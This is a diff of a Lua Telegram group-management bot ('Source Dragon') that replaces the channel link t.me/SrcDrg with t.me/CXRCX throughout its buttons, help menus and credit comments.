+inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منشئ",callback_data=msg.sender_user_id_..":RemConstructor:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_},{text="تنزيل منشئ اساسي",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif BasicConstructor(msg) then
-inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منشئ",callback_data=msg.sender_user_id_..":RemConstructor:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منشئ",callback_data=msg.sender_user_id_..":RemConstructor:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif Constructor(msg) then
-inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif Manager(msg) then
-inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif Admin(msg) then
-inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 end
 SendInline(msg.chat_id_,Text,nil,inline,msg.id_/2097152/0.5)
 end,nil)
@@ -6159,13 +6154,13 @@ if dp.first_name_ == false then
 Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙الحساب محذوف", 1, "md")
 return false  
 end
-local Text = ' ⌯︙قم باستعمال الازرار للتحكم العضو ↫ ⤈\n⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n✓'
+local Text = ' ⌯︙قم باستعمال الازرار للتحكم العضو ↫ ⤈\n⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n✓'
 inline = {
 {{text="رفع رتبه",callback_data=msg.sender_user_id_..":SetRtba:"..result.sender_user_id_},{text="تنزيل رتبه",callback_data=msg.sender_user_id_..":RemRtba:"..result.sender_user_id_}},
 {{text="كتم",callback_data=msg.sender_user_id_..":Mute:"..result.sender_user_id_},{text="الغاء كتم",callback_data=msg.sender_user_id_..":UnMute:"..result.sender_user_id_}},
 {{text="حظر",callback_data=msg.sender_user_id_..":Ban:"..result.sender_user_id_},{text="الغاء حظر",callback_data=msg.sender_user_id_..":UnBan:"..result.sender_user_id_}},
 {{text="تقيد",callback_data=msg.sender_user_id_..":Tked:"..result.sender_user_id_},{text="الغاء تقيد",callback_data=msg.sender_user_id_..":UnTked:"..result.sender_user_id_}},
-{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}
+{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}
 }
 SendInline(msg.chat_id_,Text,nil,inline,msg.id_/2097152/0.5)
 end,nil)
@@ -7412,10 +7407,10 @@ end
 tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = dp.id_,offset_ = 0,limit_ = 1},function(extra,SoOoFi,success) 
 if SoOoFi.photos_[0] then
 local bio = GetBio(dp.id_,msg.chat_id_)
-local UserName = (dp.username_ or "SrcDrg")
+local UserName = (dp.username_ or "CXRCX")
 local Text = '⌯︙منشئ المجموعه ↫ ['..dp.first_name_..'](T.me/'..UserName..')\n⌯︙'..bio..'\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ'
 keyboard = {} 
-keyboard.inline_keyboard = {{{text='• '..dp.first_name_..' •',url=("t.me/"..dp.username_ or "t.me/SrcDrg")}}}
+keyboard.inline_keyboard = {{{text='• '..dp.first_name_..' •',url=("t.me/"..dp.username_ or "t.me/CXRCX")}}}
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id='..msg.chat_id_..'&photo='..SoOoFi.photos_[0].sizes_[1].photo_.persistent_id_..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 else
@@ -7812,7 +7807,7 @@ if dp.first_name_ == false then
 Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙حساب المنشئ محذوف", 1, "md")
 return false  
 end
-local UserName = (dp.username_ or "SrcDrg")
+local UserName = (dp.username_ or "CXRCX")
 Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم رفع مالك المجموعه ↫ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md") 
 DevAIAN:sadd(WAAD.."AIAN:AIANConstructor:"..msg.chat_id_,dp.id_)
 end,nil)   
@@ -10053,7 +10048,7 @@ local TXTE = "⌯︙اعدادات المجموعه ↫ ⤈\nꔹ┉ ┉ ┉ ┉ 
 .."⌯︙زمن التكرار ↫ "..Flood_Num_Time.."\n"
 .."⌯︙عدد السبام ↫ "..spam_c.."\n"
 .."ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ \n"
-local inline = {{{text="🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .",url="t.me/SrcDrg"}}}
+local inline = {{{text="🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .",url="t.me/CXRCX"}}}
 fucktele =  msg.id_/2097152/0.5
 SendInline(msg.chat_id_,TXTE,nil,inline,fucktele)
 end
@@ -10334,7 +10329,7 @@ if Audios.Info == true then
 local Text ='⌯︙تم اختيار المقطع الصوتي لك'
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}},
+{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id='..msg.chat_id_..'&voice='..URL.escape(Audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -10596,7 +10591,7 @@ local TkeedList = DevAIAN:scard(WAAD.."AIAN:AIAN:Tkeed:"..ChatId) or 0
 local AdminsList = DevAIAN:scard(WAAD.."AIAN:Admins:"..ChatId) or 0
 local VipList = DevAIAN:scard(WAAD.."AIAN:VipMem:"..ChatId) or 0
 local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..ChatId))
-if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/SrcDrg' end
+if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/CXRCX' end
 tdcli_function({ID ="GetChat",chat_id_=ChatId},function(arg,dp)
 tdcli_function ({ID = "GetChannelMembers",channel_id_ = ChatId:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
 if dp.id_ then
@@ -10606,7 +10601,7 @@ if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
 Manager_id = admins[i].user_id_
 tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,AIAN) 
 if AIAN.first_name_ ~= false then
-ConstructorAIAN = "["..AIAN.first_name_.."](T.me/"..(AIAN.username_ or "SrcDrg")..")"
+ConstructorAIAN = "["..AIAN.first_name_.."](T.me/"..(AIAN.username_ or "CXRCX")..")"
 else 
 ConstructorAIAN = "حساب محذوف"
 end
@@ -11453,7 +11448,7 @@ local Text = [[
 ⌯︙م5 ↫ اوامر المطورين
 ⌯︙م6 ↫ اوامر الاعضاء
 ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ 
-[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/SrcDrg)➤
+[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
 ]] 
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="• اوامر الادمنيه •",callback_data="/HelpList2:"..msg.sender_user_id_},{text="• اوامر الحمايه •",callback_data="/HelpList1:"..msg.sender_user_id_}},{{text="• اوامر المنشئين •",callback_data="/HelpList4:"..msg.sender_user_id_},{text="• اوامر المدراء •",callback_data="/HelpList3:"..msg.sender_user_id_}},{{text="• اوامر الاعضاء •",callback_data="/HelpList6:"..msg.sender_user_id_},{text="• اوامر المطورين •",callback_data="/HelpList5:"..msg.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
@@ -11524,7 +11519,7 @@ local Text = [[
 ⌯︙البوتات بالطرد
 ⌯︙البوتات بالتقيد
 ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
-[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/SrcDrg)➤
+[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
 ]]
 Dev_AIAN(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
@@ -11600,7 +11595,7 @@ local Text = [[
 ⌯︙تقييد يوم + عدد الايام
 ⌯︙الغاء تقييد ↫ لالغاء التقييد بالوقت
 ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
-[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/SrcDrg)➤
+[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
 ]]
 Dev_AIAN(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
@@ -11665,7 +11660,7 @@ local Text = [[
 ⌯︙ردود المدير • ردود المطور • التحقق
 ⌯︙ضافني • حساب العمر • الزخرفه • غنيلي
 ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
-[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/SrcDrg)➤
+[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
 ]]
 Dev_AIAN(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
@@ -11724,7 +11719,7 @@ local Text = [[
 ⌯︙المنشئين الاساسيين 
 ⌯︙حذف جميع الرتب
 ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
-[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/SrcDrg)➤
+[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
 ]]
 Dev_AIAN(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
@@ -11810,7 +11805,7 @@ local Text = [[
 ⌯︙ترحيب البوت • المغادره
 ⌯︙البوت الخدمي • التواصل
 ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
-[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/SrcDrg)➤
+[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
 ]]
 Dev_AIAN(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
@@ -11858,7 +11853,7 @@ local Text = [[
 ⌯︙تحويل + بالرد ↫ صوره • ملصق • صوت • بصمه
 ⌯︙انطق + الكلام تدعم جميع اللغات مع الترجمه للعربي
 ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
-[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/SrcDrg)➤
+[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
 ]]
 Dev_AIAN(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end
@@ -12080,7 +12075,7 @@ Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لم يتم تعيين قناة الا
 end end end end
 --     Source WAAD     --
 if text == 'القناة' or text == 'قناة السورس' or text == 'قناه السورس' or text == 'قنات السورس' then 
-Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙Channel ↬ [@SrcDrg]', 1, 'md')    
+Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙Channel ↬ [@CXRCX]', 1, 'md')    
 end 
 --     Source WAAD     --
 if text == 'معلومات السيرفر' or text == 'السيرفر' or text == '↫ السيرفر ⌯' then 
@@ -12216,7 +12211,7 @@ end
 end 
 ------------------------------------------------
 -- This Source Was Developed By (AIAN) @VvTVv2.--
---   This Is The Source Channel @SrcDrg .     --
+--   This Is The Source Channel @CXRCX .     --
 --                 - WAAD -                 --
---         -- https://t.me/SrcDrg --          --
+--         -- https://t.me/CXRCX --          --
 ------------------------------------------------ 
